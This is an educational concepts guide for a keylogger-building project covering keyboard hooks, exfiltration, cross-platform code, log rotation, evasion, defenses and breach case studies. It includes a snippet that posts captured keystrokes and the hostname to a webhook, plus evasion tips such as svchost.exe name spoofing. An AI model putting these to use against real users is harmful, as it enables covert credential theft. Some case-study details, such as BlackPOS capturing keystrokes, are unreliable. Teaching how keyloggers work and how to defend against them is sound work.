# Security Concepts — Keylogger

This document explains the security concepts you'll encounter while building this project. These aren't just definitions, we'll dig into why they matter and how they actually work.

---

## 1. Keyboard Event Interception

### What It Is
Operating systems expose keyboard input through event streams that applications can subscribe to. When you press a key, the OS generates an event containing the key code, timestamp, and modifiers (Shift, Ctrl, etc). Applications like text editors use these events to respond to user input. Keyloggers exploit this same mechanism to monitor keystrokes without the user's knowledge.

### Why It Matters
Keyboard capture is the foundation of password theft, the most common attack vector in data breaches. When Equifax was breached in 2017, stolen credentials allowed attackers to access 147 million records. Those credentials often come from keyloggers deployed via phishing emails or drive-by downloads. Unlike network sniffing which requires man-in-the-middle positioning, keyloggers run directly on the victim's machine with full access to plaintext input before encryption.

### How It Works
Modern operating systems provide event APIs at different privilege levels:

```
User Space Applications
         ↓
   Input Event Queue
         ↓
    Kernel Driver
         ↓
   Hardware Controller
```

The pynput library hooks into user space event listeners. On Linux it monitors X11 or Wayland events. On macOS it uses the Accessibility API. On Windows it sets up a low-level keyboard hook via SetWindowsHookEx under the hood.

When a key is pressed, the OS delivers it to all registered listeners before the application processes it. This is why keyloggers see passwords even when they're typed into password fields that display asterisks.

### Defense Strategies
- **Virtual Keyboards**: Some banking sites use on-screen keyboards where you click letters. This defeats basic keyloggers but is vulnerable to screenshot capture.
- **Keystroke Encryption**: Tools like KeyScrambler encrypt keystrokes at the kernel level before they reach applications.
- **Behavioral Detection**: EDR systems look for suspicious patterns like reading keyboard events from non-GUI applications.
- **Hardware Security Keys**: Physical key presses can't be captured by software keyloggers (YubiKey, etc).

---

## 2. Data Exfiltration

### What It Is
Data exfiltration is the process of getting stolen data out of a compromised system and into attacker-controlled infrastructure. The challenge isn't just capturing data (that's easy), it's sending it home without getting caught by network monitoring, DLP systems, or suspicious users.

### Why It Matters
In the 2020 SolarWinds breach, attackers spent months inside networks exfiltrating data without detection. They used legitimate-looking DNS queries and HTTPS traffic to blend in.

### How It Works
Our keylogger uses webhook delivery over HTTPS:

```python
payload = {
    "timestamp": datetime.now().isoformat(),
    "host": platform.node(),
    "events": [e.to_dict() for e in events],
}

response = requests.post(webhook_url, json=payload, timeout=5)
```

This looks like normal application traffic — encrypted HTTPS, posting to what appears to be a legitimate webhook endpoint, with events batched to reduce network noise.

### Common Exfiltration Channels
- **HTTP/HTTPS POST**: Looks like API traffic, blends with normal web requests
- **DNS tunneling**: Encodes data in DNS queries, bypasses many firewalls
- **Cloud storage**: Uploads to Dropbox/Google Drive using legitimate APIs
- **Email**: Sends logs as email attachments through compromised accounts
- **Steganography**: Hides data in images posted to social media

---

## 3. Cross-Platform Malware Development

### What It Is
Malware that runs on multiple operating systems (Windows, macOS, Linux) using platform-specific APIs where necessary but sharing core logic. This maximizes attack surface since victims use different platforms.

### How It Works
Our keylogger detects the platform and loads appropriate modules:

```python
if platform.system() == "Windows":
    try:
        import win32gui
        import win32process
        import psutil
    except ImportError:
        win32gui = None
elif platform.system() == "Darwin":
    try:
        from AppKit import NSWorkspace
    except ImportError:
        NSWorkspace = None
```

Platform-specific implementations:
- **Windows**: Uses win32gui to get foreground window handle, then psutil for process info
- **macOS**: Uses NSWorkspace to query the active application
- **Linux**: Shells out to xdotool to get window title

Core functionality (keyboard capture, logging) uses cross-platform libraries like pynput. Platform-specific code is isolated in the WindowTracker component.

---

## 4. Log Rotation and Storage Strategy

### What It Is
The strategy for storing captured data locally without filling the disk or creating obviously large files that raise suspicion. Log rotation creates new files when size limits are reached.

### How It Works
LogManager implements automatic rotation:

```python
def _check_rotation(self) -> None:
    try:
        size = self.current_log_path.stat().st_size
    except FileNotFoundError:
        self._rotate()
        return

    if size / BYTES_PER_MB >= self.config.max_log_size_mb:
        self._rotate()
```

When a log file reaches the size limit (default 5MB), LogManager closes the file handle and opens a new one with a fresh timestamp.

---

## 5. Detection Evasion

### What It Is
Techniques to avoid detection by antivirus, EDR systems, network monitoring, and suspicious users.

### How It Works
Our keylogger includes a toggle key for quick pause if the victim becomes suspicious. More sophisticated malware uses:

- **Process name spoofing**: Rename to "svchost.exe" or "system_update"
- **Encryption**: Encrypt logs so disk scans don't find sensitive keywords
- **Timing analysis**: Only transmit during work hours to blend with normal traffic

---

## 6. Real-World Case Studies

### Case Study 1: Target Breach (2013)
Attackers compromised Target's payment systems using malware that included keylogging components. The malware, called BlackPOS, captured keystrokes from point-of-sale terminals to steal magnetic stripe data as employees swiped cards.

**What happened**: Over 40 million credit and debit cards were stolen during the 2013 holiday shopping season. The breach cost Target over $200 million in settlements.

**How it could have been prevented**: Application whitelisting would have blocked unauthorized executables. Real-time monitoring of processes reading keyboard events might have detected the keylogger component.

### Case Study 2: Operation Aurora (2010)
Chinese attackers targeted Google, Adobe, and dozens of other companies using sophisticated malware that included keylogging functionality.

**What happened**: Attackers gained access to source code repositories and compromised Gmail accounts. Google went public with the breach, a rare move that exposed the scope of nation-state cyber operations.

**How it could have been prevented**: Hardware security keys for authentication (Google now mandates these internally) prevent credential theft via keylogging.

---

## 7. Framework References

### MITRE ATT&CK
- **T1056.001** - Input Capture: Keylogging
- **T1041** - Exfiltration Over C2 Channel
- **T1027** - Obfuscated Files or Information
- **T1082** - System Information Discovery

### CWE
- **CWE-200** - Exposure of Sensitive Information
- **CWE-522** - Insufficiently Protected Credentials

### OWASP Top 10
- **A07:2021** - Identification and Authentication Failures
- **A08:2021** - Software and Data Integrity Failures

---

## Testing Your Understanding

Before moving to the architecture, make sure you can answer:

1. Why do keyloggers see passwords even when they're typed into fields that display asterisks?

2. What's the security difference between sending keystrokes immediately versus batching them? What trade-offs does an attacker make?

3. If you add HTTPS encryption to webhook delivery, does that protect against network monitoring? Why or why not?
